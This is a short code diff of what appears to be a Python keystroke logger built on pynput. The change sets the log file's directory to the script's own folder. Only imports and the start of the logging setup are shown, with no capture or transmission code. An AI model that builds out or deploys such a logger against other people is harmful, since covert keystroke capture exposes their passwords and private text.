@@ -2,9 +2,10 @@
 import pynput
 from pynput.keyboard import Key, Listener
 import logging
+import os
 
 # Define the directory where the log file will be saved
-log_dir = r"<path to the text file>"
+log_dir = os.path.dirname(os.path.abspath(__file__))
 
 # Configure logging settings
 logging.basicConfig(
